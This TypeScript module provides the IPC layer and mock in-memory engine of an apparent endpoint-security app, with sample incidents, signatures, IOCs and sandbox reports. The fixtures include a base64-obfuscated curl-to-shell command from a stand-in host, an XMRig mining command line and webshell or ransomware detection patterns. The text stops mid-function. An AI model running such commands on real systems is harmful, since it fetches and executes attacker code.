/**
 * Aegis-Guard IPC Core
 * Provides native Tauri IPC invocation when running inside desktop Tauri runtime,
 * and high-fidelity, interactive in-memory security engine in web preview mode.
 */

import { emit } from "./event";
import type {
  ThreatIncident,
  DebugEntry,
  StorageStats,
  AutoPruneConfig,
  PruneResult,
  ScanSummary,
  FileScanResult,
  VirusSignature,
  MalwareScanResult,
  AvEngineStats,
  NetworkConnection,
  DnsQuery,
  NetworkAttackEvent,
  NetworkDefenseConfig,
  TelemetryEvent,
  UpdateInfo,
  CanaryToken,
  AuditEntry,
  IocStats,
  IocMatch,
  SandboxAnalysisReport,
  ProcessNode,
} from "../../types";

// Simple SHA-like digest for mock audit chain
function hashString(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0;
  }
  const hex = Math.abs(hash).toString(16).padStart(8, "0");
  return `blake3_${hex}${Math.abs(hash * 31).toString(16).padStart(8, "0")}`.padEnd(32, "0");
}

// In-Memory Storage State
const state = {
  incidents: [
    {
      id: "inc-001",
      kind: "suspicious_parentage",
      severity: "high" as const,
      risk_score: 88,
      pid: 4092,
      ppid: 1102,
      process: "xmrig",
      cmdline: ["/tmp/.x11/xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444", "-u", "48edfsh7...", "-p", "x"],
      exe_path: "/tmp/.x11/xmrig",
      rule: "PAR-006: Cryptominer Process Spawned",
      confidence: "high" as const,
      reason: "Detected high-intensity CPU execution of unauthorized cryptocurrency miner spawned from hidden temporary directory.",
      ancestors: [1102, 1],
      ts: new Date(Date.now() - 320000).toISOString(),
      resolved: false,
      digest: "blake3_7f8a920b1c2e43109a",
      mitre_tactic: "Impact",
      mitre_technique: "Resource Hijacking (T1496)",
      virus_name: "Linux/Miner.XMRig.Stratum",
      virus_family: "CoinMiner",
      flags: ["VIRUS_SIGNATURE_MATCHED", "SUSPICIOUS_PATH", "HIGH_CPU"],
      factors: [
        { name: "Binary Hash Match", impact: 45, desc: "Matches known CoinMiner hash in threat database." },
        { name: "Hidden Path Execution", impact: 25, desc: "Spawned from /tmp/.x11 directory." },
        { name: "Stratum Mining Protocol", impact: 20, desc: "Connected to stratum+tcp port 4444." },
      ],
      movement_steps: [
        { ts: Date.now() - 320000, event: "Initial Download", detail: "Payload staged into /tmp via curl pipe", delta: 45 },
        { ts: Date.now() - 315000, event: "Permission Escalation", detail: "chmod +x applied to binary", delta: 25 },
        { ts: Date.now() - 310000, event: "Mining Beacon", detail: "Attempted connection to pool.minexmr.com", delta: 18 },
      ],
    },
    {
      id: "inc-002",
      kind: "encoded_payload",
      severity: "medium" as const,
      risk_score: 72,
      pid: 5120,
      ppid: 2004,
      process: "bash",
      cmdline: ["bash", "-c", "echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5jei9wIHwgc2g=' | base64 -d | sh"],
      exe_path: "/bin/bash",
      rule: "ARG-001: Obfuscated Base64 Pipe Execution",
      confidence: "medium" as const,
      reason: "Execution of double-obfuscated base64 decoded shell pipeline into subshell.",
      ancestors: [2004, 1],
      ts: new Date(Date.now() - 950000).toISOString(),
      resolved: false,
      digest: "blake3_91c33f2a1b94",
      mitre_tactic: "Defense Evasion",
      mitre_technique: "Deobfuscate/Decode Files or Information (T1027)",
      flags: ["BASE64_OBFUSCATION", "INDIRECT_SUBPROCESS"],
      factors: [
        { name: "Base64 Pipe Decode", impact: 40, desc: "Direct pipe from base64 decode to shell." },
        { name: "Non-interactive Shell", impact: 20, desc: "Executed under web server worker." },
      ],
      movement_steps: [
        { ts: Date.now() - 950000, event: "Command Injection", detail: "Subshell spawned via HTTP POST parameter", delta: 40 },
        { ts: Date.now() - 945000, event: "Deobfuscation", detail: "echo payload piped to base64 -d", delta: 32 },
      ],
    },
  ] as ThreatIncident[],

  auditLog: [
    {
      id: "audit-001",
      action: "QUARANTINE",
      pid: 3890,
      process: "nc",
      incident_id: "inc-000",
      note: "Network isolation applied to rogue reverse shell",
      status: "success",
      outcome: "SIGSTOP & Network Netfilter drop applied",
      ts_before: Date.now() - 3600000,
      ts_after: Date.now() - 3600000 + 42,
      prev_digest: "00000000000000000000000000000000",
      digest: "blake3_chain_8b41a90c12891001",
    },
    {
      id: "audit-002",
      action: "KILL",
      pid: 3912,
      process: "pwn_payload.bin",
      incident_id: "inc-prev",
      note: "Confirmed kill via challenge token CONFIRM-KILL-3912",
      status: "success",
      outcome: "Terminated via SIGKILL (Exit code 137)",
      ts_before: Date.now() - 2400000,
      ts_after: Date.now() - 2400000 + 15,
      prev_digest: "blake3_chain_8b41a90c12891001",
      digest: "blake3_chain_5c22f08a99120042",
    },
  ] as AuditEntry[],

  canaries: [
    {
      id: "canary-1",
      token: "AEGIS-CANARY-TOKEN-7F8A-9011-XK92",
      file_path: "/root/.ssh/id_rsa_canary",
      description: "Root SSH decoy private key honeytoken",
      created_ts: Date.now() - 86400000,
      triggered: true,
    },
    {
      id: "canary-2",
      token: "AEGIS-CANARY-TOKEN-4B21-8812-LL01",
      file_path: "/var/www/html/.env.vault",
      description: "Decoy database password env file",
      created_ts: Date.now() - 43200000,
      triggered: false,
    },
  ] as CanaryToken[],

  networkConnections: [
    {
      id: "conn-1",
      pid: 4092,
      process: "xmrig",
      process_name: "xmrig",
      protocol: "tcp",
      proto: "tcp",
      local_ip: "192.168.1.140",
      local_addr: "192.168.1.140",
      local_port: 54122,
      remote_ip: "185.220.101.5",
      remote_addr: "185.220.101.5",
      remote_port: 4444,
      state: "ESTABLISHED",
      direction: "outbound",
      bytes_tx: 1048576,
      bytes_rx: 2097152,
      is_blocked: false,
      threat_flag: "SUSPICIOUS_MINING_POOL",
      threat: "c2_detected",
      threat_reason: "Cryptominer Stratum Mining Pool Beacon",
    },
    {
      id: "conn-2",
      pid: 1204,
      process: "systemd-resolved",
      process_name: "systemd-resolved",
      protocol: "udp",
      proto: "udp",
      local_ip: "127.0.0.53",
      local_addr: "127.0.0.53",
      local_port: 53,
      remote_ip: "1.1.1.1",
      remote_addr: "1.1.1.1",
      remote_port: 53,
      state: "OPEN",
      direction: "outbound",
      bytes_tx: 4520,
      bytes_rx: 8940,
      is_blocked: false,
      threat_flag: null,
      threat: "safe",
      threat_reason: undefined,
    },
    {
      id: "conn-3",
      pid: 2400,
      process: "nginx",
      process_name: "nginx",
      protocol: "tcp",
      proto: "tcp",
      local_ip: "0.0.0.0",
      local_addr: "0.0.0.0",
      local_port: 443,
      remote_ip: "198.51.100.22",
      remote_addr: "198.51.100.22",
      remote_port: 51234,
      state: "ESTABLISHED",
      direction: "inbound",
      bytes_tx: 18400,
      bytes_rx: 4200,
      is_blocked: false,
      threat_flag: null,
      threat: "safe",
      threat_reason: undefined,
    },
  ] as NetworkConnection[],

  dnsQueries: [
    {
      id: "dns-1",
      domain: "pool.minexmr.com",
      query: "pool.minexmr.com",
      query_type: "A",
      qtype: "A",
      client_pid: 4092,
      process: "xmrig",
      process_name: "xmrig",
      status: "FLAGGED",
      verdict: "malicious_c2",
      resolved_ip: "185.220.101.5",
      threat_score: 95,
      ts: Date.now() - 325000,
    },
    {
      id: "dns-2",
      domain: "update.aegis-guard.local",
      query: "update.aegis-guard.local",
      query_type: "A",
      qtype: "A",
      client_pid: 1024,
      process: "aegis-engine",
      process_name: "aegis-engine",
      status: "ALLOWED",
      verdict: "safe",
      resolved_ip: "127.0.0.1",
      threat_score: 0,
      ts: Date.now() - 15000,
    },
    {
      id: "dns-3",
      domain: "c2.darknet-nexus.su",
      query: "c2.darknet-nexus.su",
      query_type: "TXT",
      qtype: "TXT",
      client_pid: 5120,
      process: "bash",
      process_name: "bash",
      status: "BLOCKED",
      verdict: "dns_tunneling",
      resolved_ip: null,
      threat_score: 98,
      ts: Date.now() - 955000,
    },
  ] as DnsQuery[],

  networkAttacks: [
    {
      id: "atk-1",
      attack_type: "DNS Tunneling / Data Exfiltration",
      rule: "NET-004",
      severity: "critical",
      source_ip: "185.220.101.5",
      source_port: 53210,
      target_ip: "192.168.1.140",
      target_port: 53,
      protocol: "UDP",
      process: "bash",
      pid: 5120,
      blocked: true,
      details: "High-entropy TXT records querying multi-level subdomain base32 chunks.",
      packet_summary: "Inbound UDP Base32 Chunk Exfiltration Stream",
      signature_hit: "SIG-NET-DNS-TUNNEL (98% Confidence)",
      defense_action: "NULL-ROUTED DROP",
      ts: Date.now() - 955000,
    },
  ] as NetworkAttackEvent[],

  defenseConfig: {
    ids_enabled: true,
    auto_drop_attackers: true,
    auto_block_c2: true,
    sniffing_detection_active: true,
    anti_port_scan_filter: true,
    port_scan_threshold: 20,
    syn_flood_protection: true,
    dns_tunneling_guard: true,
    capture_interface: "eth0 (Promiscuous)",
    blocked_ip_list: ["185.220.101.5", "194.26.29.112"],
  } as NetworkDefenseConfig,

  telemetry: [
    {
      id: "tel-1",
      ts: Date.now() - 320000,
      event_type: "EXEC_SPAWN",
      process: "xmrig",
      parent: "cron",
      pid: 4092,
      ppid: 1102,
      uid: 1000,
      score: 88,
      verdict: "alert",
      rule: "PAR-006: Cryptominer Process Spawned",
      mitre_tactic: "Impact",
      mitre_technique: "Resource Hijacking (T1496)",
      mitre: "T1496: Resource Hijacking",
      flags: ["VIRUS_SIGNATURE_MATCHED", "HIGH_CPU"],
      explanation: "Process spawned under cron background scheduler with stratum mining arguments.",
      detail: "High-intensity stratum miner execution detected from /tmp directory",
    },
    {
      id: "tel-2",
      ts: Date.now() - 950000,
      event_type: "SHELL_EXEC",
      process: "bash",
      parent: "nginx",
      pid: 5120,
      ppid: 2004,
      uid: 33,
      score: 72,
      verdict: "alert",
      rule: "ARG-001: Obfuscated Base64 Pipe Execution",
      mitre_tactic: "Defense Evasion",
      mitre_technique: "Deobfuscate/Decode Files or Information (T1027)",
      mitre: "T1027: Deobfuscate Files",
      flags: ["BASE64_OBFUSCATION"],
      explanation: "Injected shell command executing piped base64 decode.",
      detail: "Pipe base64 -d into shell under web worker uid 33",
    },
    {
      id: "tel-3",
      ts: Date.now() - 1200000,
      event_type: "FILE_TOUCH",
      process: "vim",
      parent: "bash",
      pid: 2190,
      ppid: 1800,
      uid: 1000,
      score: 12,
      verdict: "clean",
      explanation: "User text editor opened local configuration file.",
      detail: "Clean local text editor file open in home directory",
    },
  ] as TelemetryEvent[],

  sandboxReports: [
    {
      jail_id: "jail-b892a01",
      sample_name: "invoice_pdf_exploit.bin",
      family: "Trojan",
      status: "analyzed",
      isolation_type: "Linux-Namespace-Cgroup-v2 (Loopback Sinkhole)",
      network_confinement: "AIR-GAPPED (Loopback Sinkhole)",
      sha: "blake3_7f8a920b1c2e4310",
      sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      created_at: new Date(Date.now() - 7200000).toISOString(),
      runtime_ms: 2450,
      blueprint: {
        dynamic_risk_rating: 91,
        threat_level: "HIGH",
        threat_summary: "Sample performs memory unmapping and injects shellcode into svchost/systemd child process.",
        killchain_phase: "Execution & Privilege Escalation",
        evasion_mechanisms: ["Sleep Patching", "PEB Check", "API Hook Detection"],
        unpacking_detected: true,
        remediation_command: "aegis quarantine --jail jail-b892a01 && aegis wipe --hash e3b0c442",
      },
      extracted_iocs: {
        ips: ["185.220.101.5", "194.26.29.112"],
        domains: ["malware-c2-gateway.cc", "drop-payloads.su"],
        dropped_files: ["/tmp/.cache/syshook.so", "/tmp/.cache/config.bin"],
        mutex_or_pipes: ["Global\\AegisSimMutex001"],
      },
      mitre_techniques_observed: ["T1055: Process Injection", "T1027: Obfuscated Files", "T1071: Standard Protocol"],
      observed_behaviors: [
        {
          timestamp: new Date(Date.now() - 7198000).toISOString(),
          category: "Execution",
          operation: "VirtualAlloc(MEM_COMMIT | PAGE_EXECUTE_READWRITE)",
          target: "Process Memory Segment",
          risk: "critical",
          severity: "critical",
          description: "Allocated RWX executable memory region for secondary payload detonation.",
          mitre: "T1055",
        },
        {
          timestamp: new Date(Date.now() - 7196000).toISOString(),
          category: "Network",
          operation: "TCP Connect SYN",
          target: "185.220.101.5:4444",
          risk: "high",
          severity: "high",
          description: "Attempted outbound C2 beacon (sinkholed by sandbox netns).",
          mitre: "T1071",
        },
      ],
    },
  ] as SandboxAnalysisReport[],

  storageStats: {
    total_storage_bytes: 14285700,
    db_size_bytes: 4194304,
    debug_size_bytes: 153600,
    temp_files_bytes: 3145728,
    temp_files_count: 3,
    sandbox_artifacts_bytes: 5242880,
    pcap_buffer_bytes: 1702788,
    debug_entries_count: 84,
    incidents_count: 3,
    audit_entries_count: 2,
    total_reclaimable_bytes: 3299328,
    temp_artifacts: [
      { id: "art-1", path: "/tmp/aegis_scan_cache_001.bin", category: "scanner_cache", size_bytes: 524288, created_at: Date.now() - 86400000, created_ts: Date.now() - 86400000, status: "aged", stale: true },
      { id: "art-2", path: "/tmp/sandbox/jail-b892a01/dump.pcap", category: "sandbox_pcap", size_bytes: 1048576, created_at: Date.now() - 7200000, created_ts: Date.now() - 7200000, status: "isolated", stale: true },
      { id: "art-3", path: "/tmp/.aegis_entropy_scan.tmp", category: "forensics_temp", size_bytes: 262144, created_at: Date.now() - 3600000, created_ts: Date.now() - 3600000, status: "ready", stale: false },
    ],
    last_prune_ts: Date.now() - 86400000,
    last_pruned_ts: Date.now() - 86400000,
  } as StorageStats,

  autoPruneConfig: {
    enabled: true,
    retention_days: 14,
    max_debug_entries: 50,
    clean_temp_files: true,
    clean_sandbox_artifacts: true,
    clean_pcap_buffers: true,
    interval_hours: 6,
  } as AutoPruneConfig,

  signatures: [
    { id: "SIG-001", name: "Generic/Packed.UPX", family: "Packer", category: "Packer", severity: "MEDIUM", pattern: "UPX!", description: "UPX executable compressor signature.", rule_code: "AV-SIG-001", target_platform: "Cross-Platform", mitre_technique: "T1027" },
    { id: "SIG-002", name: "Linux/Miner.XMRig.Stratum", family: "CoinMiner", category: "CoinMiner", severity: "HIGH", pattern: "stratum+tcp://", description: "Cryptocurrency mining stratum pool protocol.", rule_code: "AV-SIG-002", target_platform: "Linux/Windows", mitre_technique: "T1496" },
    { id: "SIG-003", name: "PHP/Webshell.EvalPost", family: "WebShell", category: "WebShell", severity: "HIGH", pattern: "eval($_POST", description: "PHP remote webshell execution backdoor.", rule_code: "AV-SIG-003", target_platform: "Web/Linux", mitre_technique: "T1505" },
    { id: "SIG-004", name: "Generic/Ransom.Note", family: "Ransomware", category: "Ransomware", severity: "CRITICAL", pattern: "YOUR FILES HAVE BEEN ENCRYPTED", description: "Ransomware extortion note marker.", rule_code: "AV-SIG-004", target_platform: "Windows/Linux", mitre_technique: "T1486" },
    { id: "SIG-005", name: "ELF/Rootkit.Diamorphine", family: "Rootkit", category: "Rootkit", severity: "CRITICAL", pattern: "diamorphine_init", description: "LKM stealth rootkit hook signature.", rule_code: "AV-SIG-005", target_platform: "Linux Kernel", mitre_technique: "T1014" },
  ] as VirusSignature[],

  malwareResults: [
    {
      id: "res-1",
      target_path: "/tmp/.x11/xmrig",
      file_path: "/tmp/.x11/xmrig",
      is_infected: true,
      threat_name: "Linux/Miner.XMRig.Stratum",
      malware_name: "XMRig Miner",
      rule_matched: "AV-SIG-002: Stratum Protocol",
      detection_method: "Signature & Heuristic Match",
      family: "CoinMiner",
      category: "CoinMiner",
      confidence: "HIGH",
      entropy: 7.842,
      file_size: 3840292,
      is_quarantined: false,
      quarantined: false,
      hash_sha256: "8e92a0149bbcf210984a91b2c4e51928374a810f293b482a104c92b47e2a901f",
      sha256: "8e92a0149bbcf210984a91b2c4e51928374a810f293b482a104c92b47e2a901f",
      indicators: ["stratum+tcp://", "minexmr.com", "HIGH_ENTROPY_PACKED"],
      remediation_status: "UNREMEDIATED",
      scanned_at: Date.now() - 320000,
      status: "infected",
    },
  ] as MalwareScanResult[],

  whitelistedApps: [
    { id: "app-1", name: "Vite Development Server", path: "/usr/local/bin/vite", added_ts: Date.now() - 172800000 },
    { id: "app-2", name: "Node.js Runtime", path: "/usr/local/bin/node", added_ts: Date.now() - 172800000 },
  ],

  debugLog: [
    {
      id: "dbg-1",
      process: "code-insiders",
      rule: "PATH-002",
      note: "Development IDE background watcher suppressed by dev safeguard",
      suppression_reason: "Trusted Developer Tool Whitelist",
      category: "DEV_TOOL",
      ts: Date.now() - 60000,
      pid: 1420,
      ppid: 1,
      cmdline: ["/opt/vscode/code-insiders", "--type=watcher"],
      original_score: 55,
      adjusted_score: 5,
    },
    {
      id: "dbg-2",
      process: "git",
      rule: "ARG-004",
      note: "Repository status probe executed under standard developer UID",
      suppression_reason: "Benign Development Heuristic",
      category: "DEV_TOOL",
      ts: Date.now() - 120000,
      pid: 2901,
      ppid: 1420,
      cmdline: ["git", "status", "--porcelain"],
      original_score: 40,
      adjusted_score: 0,
    },
  ] as DebugEntry[],
};

// Return a simulated process tree
function buildMockProcessList(): ProcessNode[] {
  return [
    {
      id: "proc-1",
      pid: 1,
      ppid: 0,
      uid: 0,
      name: "systemd",
      cmdline: ["/sbin/init"],
      exe: "/sbin/init",
      cwd: "/",
      start_time: Date.now() - 86400000,
      ts: Date.now() - 86400000,
      flagged: false,
      children: [
        {
          id: "proc-1102",
          pid: 1102,
          ppid: 1,
          uid: 0,
          name: "cron",
          cmdline: ["/usr/sbin/cron", "-f"],
          exe: "/usr/sbin/cron",
          cwd: "/etc",
          start_time: Date.now() - 86400000,
          ts: Date.now() - 86400000,
          flagged: true,
          children: [
            {
              id: "proc-4092",
              pid: 4092,
              ppid: 1102,
              uid: 1000,
              name: "xmrig",
              cmdline: ["/tmp/.x11/xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444"],
              exe: "/tmp/.x11/xmrig",
              cwd: "/tmp/.x11",
              start_time: Date.now() - 320000,
              ts: Date.now() - 320000,
              flagged: true,
              children: [],
              anomaly: {
                rule: "PAR-006: Cryptominer Process Spawned",
                confidence: "high",
                risk_score: 88,
                severity: "high",
                reason: "High CPU miner spawned from hidden temporary directory with stratum pool flags.",
                parent_exe: "/usr/sbin/cron",
                ancestors: [1102, 1],
                virus_name: "Linux/Miner.XMRig.Stratum",
                virus_family: "CoinMiner",
                flags: ["VIRUS_SIGNATURE_MATCHED", "SUSPICIOUS_PATH", "HIGH_CPU"],
                factors: [
                  { name: "Known Coinminer Signature", impact: 45, score: 45, desc: "XMRig string pattern" },
                  { name: "Hidden Temp Executable", impact: 25, score: 25, desc: "/tmp/.x11 path" },
                ],
                mitre_tactic: "Impact",
                mitre_technique: "Resource Hijacking (T1496)",
              },
            },
          ],
        },
        {
          id: "proc-2004",
          pid: 2004,
          ppid: 1,
          uid: 33,
          name: "nginx",
          cmdline: ["nginx: worker process"],
          exe: "/usr/sbin/nginx",
          cwd: "/var/www/html",
          start_time: Date.now() - 43200000,
          ts: Date.now() - 43200000,
          flagged: true,
          children: [
            {
              id: "proc-5120",
              pid: 5120,
              ppid: 2004,
              uid: 33,
              name: "bash",
              cmdline: ["bash", "-c", "echo 'Y3VybCAtcyBodHRw... | base64 -d | sh"],
              exe: "/bin/bash",
              cwd: "/var/www/html",
              start_time: Date.now() - 950000,
              ts: Date.now() - 950000,
              flagged: true,
              children: [],
              anomaly: {
                rule: "ARG-001: Obfuscated Base64 Pipe Execution",
                confidence: "medium",
                risk_score: 72,
                severity: "medium",
                reason: "Double-obfuscated base64 decoded shell pipeline executed under web worker UID.",
                parent_exe: "/usr/sbin/nginx",
                ancestors: [2004, 1],
                flags: ["BASE64_OBFUSCATION", "WEB_WORKER_CHILD"],
                factors: [
                  { name: "Base64 Pipe Decode", impact: 40, score: 40 },
                  { name: "Spawned by Web Server", impact: 32, score: 32 },
                ],
                mitre_tactic: "Defense Evasion",
                mitre_technique: "Deobfuscate/Decode Files (T1027)",
              },
            },
          ],
        },
        {
          id: "proc-1000",
          pid: 1000,
          ppid: 1,
          uid: 0,
          name: "aegis-engine",
          cmdline: ["/opt/aegis/bin/aegis-engine", "--daemon", "--ebpf"],
          exe: "/opt/aegis/bin/aegis-engine",
          cwd: "/opt/aegis",
          start_time: Date.now() - 86400000,
          ts: Date.now() - 86400000,
          flagged: false,
          children: [],
        },
      ],
    },
  ];
}

export async function invoke<T = any>(cmd: string, args: Record<string, any> = {}): Promise<T> {
  // 1. Check if running inside native Tauri runtime
  if (
    typeof window !== "undefined" &&
    (window as any).__TAURI_INTERNALS__ &&
    (window as any).__TAURI__?.core?.invoke
  ) {
    try {
      return await (window as any).__TAURI__.core.invoke(cmd, args);
    } catch (e) {
      console.warn(`Native Tauri invoke(${cmd}) failed, falling back:`, e);
    }
  }

  // 2. Query live kernel backend (/api/ipc)
  try {
    const resp = await fetch("/api/ipc", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd, args }),
    });
    if (resp.ok) {
      const liveData = await resp.json();
      if (liveData !== null && liveData !== undefined) {
        return liveData as T;
      }
    }
  } catch (err) {
    // Fallback if backend is unavailable or offline
  }

  // 3. Web in-browser fallback implementation
  switch (cmd) {
    case "list_processes": {
      return buildMockProcessList() as unknown as T;
    }

    case "list_incidents": {
      const limit = args.limit || 50;
      const offset = args.offset || 0;
      return state.incidents.slice(offset, offset + limit) as unknown as T;
    }

    case "resolve_incident": {
      const inc = state.incidents.find((i) => i.id === args.id);
      if (inc) {
        inc.resolved = true;
        emit("incident-resolved", { id: args.id });
      }
      return true as unknown as T;
    }

    case "count_open": {
      const open = state.incidents.filter((i) => !i.resolved).length;
      return open as unknown as T;
    }

    case "export_markdown": {
      const openCount = state.incidents.filter((i) => !i.resolved).length;
      return `# Aegis-Guard Threat Forensics Report
Generated: ${new Date().toISOString()}
Open Threats: ${openCount}
Engine Version: 4.6.0 (eBPF Kernel Protection Active)

## Summary of Active Incidents
${state.incidents
  .map(
    (i) => `### [${i.severity.toUpperCase()}] ${i.process} (PID ${i.pid})
- **Rule:** ${i.rule}
- **Confidence:** ${i.confidence}
- **Command:** \`${i.cmdline.join(" ")}\`
- **Reason:** ${i.reason}
- **MITRE Technique:** ${i.mitre_technique || "N/A"}
- **Status:** ${i.resolved ? "RESOLVED" : "ACTIVE THREAT"}
`
  )
  .join("\n")}
` as unknown as T;
    }

    case "export_json": {
      return JSON.stringify(state.incidents, null, 2) as unknown as T;
    }

    case "scan_entropy": {
      const p = args.path || args.request?.path || "/tmp";
      const results: FileScanResult[] = [
        {
          path: `${p}/packed_sample.elf`,
          entropy: 7.912,
          mime_guess: "application/x-executable",
          size_bytes: 524288,
          risk: "high",
          note: "High Shannon entropy (7.912/8.0) indicates cryptographic packing or encryption.",
          is_packed: true,
        },
        {
          path: `${p}/dropper_stub.sh`,
          entropy: 6.845,
          mime_guess: "text/x-shellscript",
          size_bytes: 4096,
          risk: "medium",
          note: "Elevated entropy from base64 chunks embedded in shell script.",
        },
        {
          path: `${p}/sys_config.json`,
          entropy: 4.120,
          mime_guess: "application/json",
          size_bytes: 1240,
          risk: "normal",
          note: "Standard structured text entropy distribution.",
        },
        {
          path: `${p}/readme.txt`,
          entropy: 3.421,
          mime_guess: "text/plain",
          size_bytes: 512,
          risk: "low",
          note: "Natural language English distribution.",
        },
      ];
      const summary: ScanSummary = {
        scanned_count: 4,
        scanned_files: 4,
        high_risk_count: 1,
        high_risk: 1,
        medium_risk_count: 1,
        clean_count: 2,
        skipped_count: 0,
        total_bytes: 530136,
        duration_ms: 124,
        elapsed_ms: 124,
        results,
      };
      return summary as unknown as T;
    }

    case "check_update": {
      const info: UpdateInfo = {
        current_version: "1.1.0",
        engine_version: "4.6.0",
        latest_version: "1.1.0",
        update_available: false,
        release_url: "https://github.com/SepJs/aegis-guard/releases",
        release_notes: "Engine signatures, heuristic doubtful triage and namespace sandbox hotpatch active.",
        auto_update_enabled: true,
      };
      return info as unknown as T;
    }

    case "set_auto_update": {
      return (args.enabled ?? true) as unknown as T;
    }

    case "apply_update": {
      return {
        status: "applied",
        app_version: "1.1.0",
        engine_version: "4.6.0",
        message: "Engine signatures and heuristic rules live-updated to v4.6.0",
      } as unknown as T;
    }

    case "generate_challenge": {
      const pid = args.pid || 1000;
      const action = (args.action || "kill").toUpperCase();
      return `CONFIRM-${action}-${pid}` as unknown as T;
    }

    case "execute_action": {
      const pid = args.pid;
      const action = (args.action || "kill").toUpperCase();
      const processName = args.processName || `proc-${pid}`;
      const lastEntry = state.auditLog[state.auditLog.length - 1];
      const prev_digest = lastEntry ? lastEntry.digest : "00000000000000000000000000000000";
      const digest = hashString(`${prev_digest}:${action}:${pid}:${Date.now()}`);

      const audit: AuditEntry = {
        id: `audit-${Date.now()}`,
        action,
        pid,
        process: processName,
        incident_id: args.incidentId || null,
        note: args.note || `Manual ${action} action executed via Aegis console`,
        status: "success",
        outcome: action === "KILL" ? "SIGKILL dispatched (Process terminated)" : action === "QUARANTINE" ? "Quarantine network containment enforced" : "Process whitelisted in kernel baseline",
        ts_before: Date.now() - 10,
        ts_after: Date.now(),
        prev_digest,
        digest,
      };
      state.auditLog.push(audit);

      if (args.incidentId) {
        const inc = state.incidents.find((i) => i.id === args.incidentId);
        if (inc) inc.resolved = true;
      }

      return {
        message: `Action ${action} successfully executed on ${processName} (PID: ${pid}). Cryptographic audit log updated.`,
      } as unknown as T;
    }

    case "list_audit_log": {
      return [...state.auditLog].reverse() as unknown as T;
    }

    case "verify_audit_chain": {
      const errors: string[] = [];
      for (let i = 1; i < state.auditLog.length; i++) {
        if (state.auditLog[i].prev_digest !== state.auditLog[i - 1].digest) {
          errors.push(`Hash chain tamper detected at entry ${state.auditLog[i].id}: predecessor digest mismatch.`);
        }
      }
      return errors as unknown as T;
    }

    case "list_whitelist": {
      return state.whitelistedApps as unknown as T;
    }

    case "remove_from_whitelist": {
      return true as unknown as T;
    }

    case "get_ioc_stats": {
      const stats: IocStats = {
        ips: 14205,
        cidrs: 890,
        domains: 29400,
        hashes: 65120,
      };
      return stats as unknown as T;
    }

    case "check_ioc_manual": {
      const val = (args.value || "").trim().toLowerCase();
      const knownMalicious = ["185.220.101.5", "194.26.29.112", "pool.minexmr.com", "c2.darknet-nexus.su", "evil.cz"];
      if (knownMalicious.some((k) => val.includes(k))) {
        const match: IocMatch = {
          ioc: val,
          kind: val.includes(".") && !val.includes(":") ? "domain/ip" : "network",
          threat_type: val.includes("miner") ? "CoinMiner C2 Pool" : "Command & Control / Reverse Shell",
          feed: "Aegis Bundled Threat Intel + URLhaus Community",
          confidence: 96,
          context: "Active threat intelligence match in real-time blocklist feed.",
        };
        return match as unknown as T;
      }
      return null as unknown as T;
    }

    case "list_canaries": {
      return state.canaries as unknown as T;
    }

    case "create_canary": {
      const token = `AEGIS-CANARY-${Math.random().toString(36).substring(2, 8).toUpperCase()}-${Date.now().toString(36).toUpperCase()}`;
      const newCanary: CanaryToken = {
        id: `canary-${Date.now()}`,
        token,
        file_path: args.filePath || "/tmp/canary_file",
        description: args.description || "Canary decoy token",
        created_ts: Date.now(),
        triggered: false,
      };
      state.canaries.push(newCanary);
      return newCanary as unknown as T;
    }

    case "delete_canary": {
      state.canaries = state.canaries.filter((c) => c.id !== args.id);
      return true as unknown as T;
    }

    case "trigger_canary_test": {
      const c = state.canaries.find((item) => item.id === args.id);
      if (c) {
        c.triggered = true;
        const alertInc: ThreatIncident = {
          id: `inc-canary-${Date.now()}`,
          kind: "honeytoken_trip",
          severity: "critical",
          risk_score: 99,
          pid: 7712,
          ppid: 1,
          process: "tripwire_tester",
          cmdline: ["cat", c.file_path],
          exe_path: "/bin/cat",
          rule: "CANARY-001: Decoy Honeytoken Access Detected",
          confidence: "high",
          reason: `Honeytoken '${c.token}' embedded in '${c.file_path}' was read! Potential credential exfiltration detected.`,
          ancestors: [1],
          ts: new Date().toISOString(),
          resolved: false,
          digest: hashString(c.token),
          mitre_tactic: "Credential Access",
          mitre_technique: "Honeytoken Tripwire (T1555)",
          flags: ["CANARY_TRIGGERED", "HIGH_FIDELITY_TRIP"],
          factors: [{ name: "Decoy Token Tripped", impact: 80, score: 80 }],
          movement_steps: [{ ts: Date.now(), event: "Access Detected", detail: `File ${c.file_path} read by PID 7712`, delta: 80 }],
        };
        state.incidents.unshift(alertInc);
        emit("anomaly", alertInc);
      }
      return true as unknown as T;
    }

    case "list_network_connections": {
      return state.networkConnections as unknown as T;
    }

    case "list_dns_queries": {
      return state.dnsQueries as unknown as T;
    }

    case "list_network_attacks": {
      return state.networkAttacks as unknown as T;
    }

    case "get_network_defense_config": {
      return state.defenseConfig as unknown as T;
    }

    case "update_network_defense_config": {
      state.defenseConfig = { ...state.defenseConfig, ...(args.config || {}) };
      return state.defenseConfig as unknown as T;
    }

    case "block_remote_ip":
    case "block_ip_address": {
      const ip = args.ip;
      if (ip && !state.defenseConfig.blocked_ip_list.includes(ip)) {
        state.defenseConfig.blocked_ip_list.push(ip);
      }
      return true as unknown as T;
    }

    case "unblock_remote_ip":
    case "unblock_ip_address": {
      const ip = args.ip;
      if (ip) {
        state.defenseConfig.blocked_ip_list = state.defenseConfig.blocked_ip_list.filter((x) => x !== ip);
      }
      return true as unknown as T;
    }

    case "simulate_network_attack": {
      const type = args.attack_type || "SYN Flood Attack";
      const newAtk: NetworkAttackEvent = {
        id: `atk-${Date.now()}`,
        attack_type: type,
        rule: type.includes("SYN") ? "NET-001" : type.includes("Port") ? "NET-003" : "NET-005",
        severity: "critical",
        source_ip: "198.51.100.99",
        source_port: 52140,
        target_ip: "192.168.1.140",
        target_port: 443,
        protocol: "TCP",
        process: "unknown",
        pid: 0,
        blocked: true,
        details: `Simulated ${type} from 198.51.100.99 — instantly intercepted by Promiscuous Raw Socket IDS.`,
        packet_summary: `Interception of anomalous ${type} burst`,
        signature_hit: `NET-RULE-${type.substring(0, 3).toUpperCase()}`,
        defense_action: "NULL-ROUTED DROP",
        ts: Date.now(),
      };
